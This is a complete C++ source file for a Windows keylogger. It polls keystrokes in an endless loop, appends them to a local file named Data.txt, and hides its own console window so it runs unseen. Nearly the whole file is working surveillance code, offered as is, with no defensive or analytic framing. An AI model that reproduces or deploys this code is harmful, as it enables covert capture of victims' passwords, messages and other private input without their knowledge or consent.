// ************************************ Keylogger **********************************************************

#include<iostream>
#include<Windows.h>   
#include<Winuser.h> 
#include<fstream>
using namespace std;

void check(void);
void hide(void);

int main()
{
	hide();
	check();
	return 0;
}

void check()
{
	//declaration
	char key;

	for (;;)                
	{
		for (key = 8; key <= 126; key++)   // nested loop - range of characters we'll
									 // read ( range got from ASCII codes )
		{
			if (GetAsyncKeyState(key) == -32767)  // check - we press any key
			{
				ofstream write("Data.txt", ios::app);
				 // IF the value of key is greater than 64 but lesser than 91 
				 // and the shift key is not pressed(written as !(GetAsyncKey(0x10))) 
				 // - where 0x10 is the hexadecimal notation for the Shift key 
				// Then please add 32 to the previous key values.

				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10)))
				{
					key += 32;
					write << key;
					write.close();
					break;
				}

				else if ((key > 64) && (key < 91))
				{
					write << key;
					write.close();
					break;
				}

				else {
					switch (key)
					{
					case 27: write << "<Esc>";
					case 127: write << "<DEL>";

					case 48:
					{
						if (GetAsyncKeyState(0x10))  // Shift + 0
							write << ")";
						else
							write << "0";
					}break;

					case 49:
					{
						if (GetAsyncKeyState(0x10))  // shift + 1
							write << "!";
						else
							write << "1";
					}break;

					case 50:
					{
						if (GetAsyncKeyState(0x10))
							write << "@";
						else
							write << "2";
					}break;

					case 51:
					{
						if (GetAsyncKeyState(0x10))
							write << "#";
						else
							write << "3";
					}break;

					case 52:
					{
						if (GetAsyncKeyState(0x10))
							write << "$";
						else
							write << "4";
					}break;

					case 53:
					{
						if (GetAsyncKeyState(0x10))
							write << "%";
						else
							write << "5";
					}break;

					case 54:
					{
						if (GetAsyncKeyState(0x10))
							write << "^";
						else
							write << "6";
					}break;

					case 55:
					{
						if (GetAsyncKeyState(0x10))
							write << "&";
						else
							write << "7";
					}break;

					case 56:
					{
						if (GetAsyncKeyState(0x10))
							write << "*";
						else
							write << "8";
					}break;

					case 57:
					{
						if (GetAsyncKeyState(0x10))
							write << "(";
						else
							write << "9";
					}break;

					case VK_SPACE:   // virtual keys
						write << " ";
						break;

					case VK_RETURN:
						write << "\n";
						break;

					case VK_SHIFT:
						write << "#SHIFT#";
						break;

					case VK_BACK:
						write << "\b";
						break;

					case VK_RBUTTON:
						write << "#R_CLICK#";
						break;

					case VK_CAPITAL:
						write << "#CAPS_LOCK#";
						break;

					case VK_TAB:
						write << "#TAB";
						break;

					case VK_UP:
						write << "#UP";
						break;

					case VK_DOWN:
						write << "#DOWN";
						break;

					case VK_LEFT:
						write << "#LEFT";
						break;

					case VK_RIGHT:
						write << "#RIGHT";
						break;

					case VK_CONTROL:
						write << "#CONTROL";
						break;

					default: write << key;

					}
				}
			}

		}
	}

}

void hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth,0);
}
